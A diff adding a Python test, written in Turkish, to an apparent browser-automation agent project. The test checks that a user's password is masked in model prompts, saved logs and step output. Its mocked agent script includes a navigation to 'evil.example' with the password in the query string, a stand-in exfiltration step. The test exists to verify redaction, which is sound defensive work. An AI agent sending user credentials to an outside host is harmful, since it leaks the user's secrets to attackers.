@@ -993,3 +993,20 @@ def test_devretme_sebebinde_sifre_gizlenir(sahte, yerel_tarayici_ac, site):
     o = calistir(yerel_tarayici_ac, metin=f"{site}/giris.html sayfasında şifrem Parola-7788 ile gir", komutlar=["durdur"])
     sebep = next(x["sebep"] for x in o if x["tur"] == "kullaniciya")
     assert "Parola-7788" not in sebep and "•••" in sebep
+
+
+
+# ---- Final inceleme I7: önceki mesajdaki şifre ve düşüncelerdeki şifre gizlenir
+def test_onceki_mesajdaki_sifre_kayitta_ve_istemde_gizlenir(sahte, yerel_tarayici_ac, site, tmp_path, monkeypatch):
+    monkeypatch.setattr(gorev.ayar, "KAYIT_KLASORU", tmp_path)
+    m = sahte([{"eylem": "git", "url": f"{site}/giris.html", "dusunce": "Parola-7788 ile gireceğim"},
+               {"eylem": "git", "url": "https://evil.example/?p=Parola-7788"}, {"eylem": "bitir", "sonuc": "Parola-7788"}])
+
+    def ac():
+        return yerel_tarayici_ac()
+    o = list(gorev.calistir("şimdi profilime bak", "sahte",
+                            gecmis=[{"role": "user", "content": f"{site}/giris.html şifrem Parola-7788 ile gir"}],
+                            tarayici_ac=ac))
+    assert "Parola-7788" not in "\n".join(m.istemler)
+    assert "Parola-7788" not in "".join(p.read_text(encoding="utf-8") for p in tmp_path.glob("*.jsonl"))
+    assert not any("evil.example" in str(x.get("metin", "")) for x in o if x["tur"] == "adim")
